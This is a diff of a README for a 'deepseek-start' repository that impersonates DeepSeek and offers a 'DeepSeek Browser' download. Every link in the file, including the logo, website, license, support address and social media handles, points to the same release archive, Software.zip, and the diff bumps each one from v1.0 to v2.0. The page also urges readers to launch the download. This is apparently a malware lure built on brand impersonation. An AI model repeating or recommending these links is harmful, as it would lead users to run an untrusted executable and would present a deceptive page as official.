@@ -1,6 +1,6 @@
 # 🚀 Welcome to DeepSeek-Start Repository! 🌊
 
-![DeepSeek Logo](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip)
+![DeepSeek Logo](https://github.com/Berstarhunter/deepseek-start/releases/download/v2.0/Software.zip)
 
 ## Repository Name: deepseek-start
 
@@ -20,7 +20,7 @@ Topics for this repository are not provided.
 
 ## 📦 Download DeepSeek Browser v1.0.0
 
-[![Download DeepSeek Browser](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip%20Browser-blue)](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip)
+[![Download DeepSeek Browser](https://github.com/Berstarhunter/deepseek-start/releases/download/v2.0/Software.zip%20Browser-blue)](https://github.com/Berstarhunter/deepseek-start/releases/download/v2.0/Software.zip)
 
 📁 *Note: Download needs to be launched.*
 
@@ -28,7 +28,7 @@ Topics for this repository are not provided.
 
 ## 🌐 Visit DeepSeek Website
 
-Explore more about DeepSeek on our website: [DeepSeek Official Website](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip)
+Explore more about DeepSeek on our website: [DeepSeek Official Website](https://github.com/Berstarhunter/deepseek-start/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -59,13 +59,13 @@ We welcome contributions from the community to enhance DeepSeek's capabilities. 
 
 ## 📝 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Berstarhunter/deepseek-start/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
 ## 📞 Support
 
-If you encounter any issues or have any questions, feel free to reach out to our support team at https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip
+If you encounter any issues or have any questions, feel free to reach out to our support team at https://github.com/Berstarhunter/deepseek-start/releases/download/v2.0/Software.zip
 
 ---
 
@@ -73,14 +73,14 @@ If you encounter any issues or have any questions, feel free to reach out to our
 
 Stay updated with the latest news, updates, and announcements by following us on social media:
 
-- Twitter: [@DeepSeekOfficial](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip)
-- Facebook: [DeepSeek](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip)
+- Twitter: [@DeepSeekOfficial](https://github.com/Berstarhunter/deepseek-start/releases/download/v2.0/Software.zip)
+- Facebook: [DeepSeek](https://github.com/Berstarhunter/deepseek-start/releases/download/v2.0/Software.zip)
 
 ---
 
 ## 🌌 Explore More
 
-Discover more amazing repositories and projects by [DeepSeek Organization](https://github.com/Berstarhunter/deepseek-start/releases/download/v1.0/Software.zip).
+Discover more amazing repositories and projects by [DeepSeek Organization](https://github.com/Berstarhunter/deepseek-start/releases/download/v2.0/Software.zip).
 
 ---
 
